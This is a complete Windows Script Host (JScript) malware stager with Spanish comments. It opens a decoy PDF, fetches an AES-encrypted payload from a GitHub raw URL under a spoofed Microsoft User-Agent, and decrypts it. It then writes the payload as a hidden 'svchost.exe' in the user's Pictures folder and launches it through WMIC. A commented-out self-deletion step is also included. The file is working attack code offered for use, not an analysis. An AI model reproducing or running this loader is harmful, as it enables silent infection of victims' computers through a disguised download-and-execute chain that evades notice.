// ========================================================================
// STAGER FINAL V2 - Manejo correcto de payloads grandes
// ========================================================================

var PAYLOAD_URL = "https://raw.githubusercontent.com/ggggwrmsfootmen/curly-fortnight/refs/heads/main/health-check.enc";
var AES_KEY = "1234567890123456"; // 16 bytes
var AES_IV = "1234567890123456";  // 16 bytes

var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var scriptDir = fso.GetParentFolderName(WScript.ScriptFullName);

// === CARGAR CRYPTOJS ===
WScript.Echo("[*] Cargando CryptoJS...");
try {
    var path1 = scriptDir + "\\cryptojs-aes.js";
    if (!fso.FileExists(path1)) {
        WScript.Echo("[!] No se encuentra: cryptojs-aes.js");
        WScript.Quit(1);
    }
    var file1 = fso.OpenTextFile(path1, 1);
    var code1 = file1.ReadAll();
    file1.Close();
    eval(code1);
    WScript.Echo("[+] CryptoJS AES cargado");
    
    var path2 = scriptDir + "\\cryptojs-mode-cfb.js";
    if (!fso.FileExists(path2)) {
        WScript.Echo("[!] No se encuentra: cryptojs-mode-cfb.js");
        WScript.Quit(1);
    }
    var file2 = fso.OpenTextFile(path2, 1);
    var code2 = file2.ReadAll();
    file2.Close();
    eval(code2);
    WScript.Echo("[+] Modo CFB cargado");
    
} catch(e) {
    WScript.Echo("[!] Error cargando CryptoJS: " + e.message);
    WScript.Quit(1);
}

// === FUNCIONES ===

function openPDF() {
    try {
        var folder = fso.GetFolder(scriptDir);
        var files = new Enumerator(folder.Files);
        
        for (; !files.atEnd(); files.moveNext()) {
            var file = files.item();
            if (file.Name.toLowerCase().indexOf(".pdf") > -1) {
                WScript.Echo("[+] Abriendo PDF: " + file.Name);
                shell.Run('"' + file.Path + '"', 1, false);
                return true;
            }
        }
    } catch(e) {}
    return false;
}

function downloadFile(url) {
    try {
        WScript.Echo("[*] Descargando payload...");
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.setRequestHeader("User-Agent", "Microsoft-Delivery-Optimization/10.0");
        xhr.send();
        
        if (xhr.status == 200) {
            WScript.Echo("[+] Descargado: " + xhr.responseText.length + " bytes");
            return xhr.responseText;
        } else {
            WScript.Echo("[!] Error HTTP: " + xhr.status);
            return null;
        }
    } catch(e) {
        WScript.Echo("[!] Error descargando: " + e.message);
        return null;
    }
}

function decryptPayload(b64data, key, iv) {
    try {
        WScript.Echo("[*] Descifrando payload...");
        
        var rawResponse = b64data.replace(/[\r\n]+/g, "");
        var keyParsed = CryptoJS.enc.Utf8.parse(key);
        var ivParsed = CryptoJS.enc.Utf8.parse(iv);
        var encrypted = CryptoJS.enc.Base64.parse(rawResponse);
        
        var decrypted = CryptoJS.AES.decrypt({ciphertext: encrypted}, keyParsed, {
            iv: ivParsed,
            mode: CryptoJS.mode.CFB,
            padding: CryptoJS.pad.NoPadding || { pad: function(){}, unpad: function(){} }
        });
        
        var hex_full = decrypted.toString(CryptoJS.enc.Hex);
        var hex_dec = hex_full;
        
        if (hex_full && hex_full.length >= 16) {
            function readLE64FromHex(h) {
                var o = 0;
                for (var i = 0; i < 8; i++) {
                    var byteHex = h.substr(i * 2, 2);
                    var b = parseInt(byteHex, 16);
                    o |= (b << (8 * i)) >>> 0;
                }
                return o >>> 0;
            }
            
            var hex_needed = readLE64FromHex(hex_full);
            
            if (hex_needed && hex_needed * 2 <= hex_full.length - 16) {
                hex_dec = hex_full.substr(16, hex_needed * 2);
            }
        }
        
        WScript.Echo("[+] Descifrado: " + hex_dec.length + " caracteres hex");
        return hex_dec;
    } catch(e) {
        WScript.Echo("[!] Error descifrando: " + e.message);
        return null;
    }
}

function hexToBinary(hexData, outputPath) {
    try {
        WScript.Echo("[*] Convirtiendo HEX a binario (" + hexData.length + " caracteres)...");
        
        var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
        var hexFile = tempFolder + "\\hex_temp.txt";
        
        // Guardar HEX en archivo temporal
        WScript.Echo("[*] Guardando HEX temporal...");
        var hf = fso.CreateTextFile(hexFile, true);
        hf.Write(hexData);
        hf.Close();
        
        // Crear VBS que lea del archivo (para evitar límites de strings)
        var vbsPath = tempFolder + "\\decode_hex.vbs";
        
        var vbsCode = 'On Error Resume Next\n';
        vbsCode += 'Dim fso, hexStr, objStream, i\n';
        vbsCode += 'Set fso = CreateObject("Scripting.FileSystemObject")\n';
        vbsCode += 'Set hf = fso.OpenTextFile("' + hexFile + '", 1)\n';
        vbsCode += 'hexStr = hf.ReadAll()\n';
        vbsCode += 'hf.Close()\n';
        vbsCode += 'Set objStream = CreateObject("ADODB.Stream")\n';
        vbsCode += 'objStream.Type = 1\n';
        vbsCode += 'objStream.Open\n';
        vbsCode += 'For i = 1 To Len(hexStr) Step 2\n';
        vbsCode += '    objStream.Write Chr(CLng("&H" & Mid(hexStr, i, 2)))\n';
        vbsCode += 'Next\n';
        vbsCode += 'objStream.SaveToFile "' + outputPath + '", 2\n';
        vbsCode += 'objStream.Close\n';
        vbsCode += 'If Err.Number <> 0 Then\n';
        vbsCode += '    WScript.Echo "VBS Error: " & Err.Description\n';
        vbsCode += 'Else\n';
        vbsCode += '    WScript.Echo "VBS: Conversion exitosa"\n';
        vbsCode += 'End If\n';
        
        var vf = fso.CreateTextFile(vbsPath, true);
        vf.Write(vbsCode);
        vf.Close();
        
        WScript.Echo("[*] Ejecutando conversion VBS...");
        shell.Run("cscript //nologo " + vbsPath, 1, true);
        
        // Limpiar temporales
        try { fso.DeleteFile(vbsPath); } catch(e) {}
        try { fso.DeleteFile(hexFile); } catch(e) {}
        
        if (fso.FileExists(outputPath)) {
            var size = fso.GetFile(outputPath).Size;
            if (size > 0) {
                WScript.Echo("[+] Binario creado: " + size + " bytes");
                return true;
            } else {
                WScript.Echo("[!] El archivo se creó pero está vacío");
                return false;
            }
        } else {
            WScript.Echo("[!] El archivo no fue creado");
            return false;
        }
    } catch(e) {
        WScript.Echo("[!] Error convirtiendo: " + e.message);
        return false;
    }
}

function executePayload(exePath) {
    try {
        WScript.Echo("[*] Ocultando archivo...");
        shell.Run('attrib +H +S "' + exePath + '"', 0, true);
        
        WScript.Echo("[*] Ejecutando payload con WMIC...");
        var cmd = 'cmd /c wmic process call create "' + exePath.replace(/\\/g, "\\\\") + '"';
        shell.Run(cmd, 0, true);
        
        WScript.Echo("[+] Payload ejecutado");
        return true;
    } catch(e) {
        WScript.Echo("[!] Error ejecutando: " + e.message);
        return false;
    }
}

// === FLUJO PRINCIPAL ===

WScript.Echo("========================================");
WScript.Echo("STAGER INICIANDO...");
WScript.Echo("========================================\n");

try {
    openPDF();
    WScript.Sleep(1000);
    
    var encryptedData = downloadFile(PAYLOAD_URL);
    if (!encryptedData) WScript.Quit(1);
    
    var hexData = decryptPayload(encryptedData, AES_KEY, AES_IV);
    if (!hexData) WScript.Quit(1);
    
    var outputPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Pictures\\svchost.exe";
    if (!hexToBinary(hexData, outputPath)) WScript.Quit(1);
    
    if (!executePayload(outputPath)) WScript.Quit(1);
    
    WScript.Sleep(2000);
    // Comentar auto-destrucción para testing
    // try { fso.DeleteFile(WScript.ScriptFullName); } catch(e) {}
    
    WScript.Echo("\n[+] COMPLETADO");
    
} catch(e) {
    WScript.Echo("[!] ERROR: " + e.message);
    WScript.Quit(1);
}

WScript.Echo("\nPresiona ENTER...");
WScript.StdIn.ReadLine();
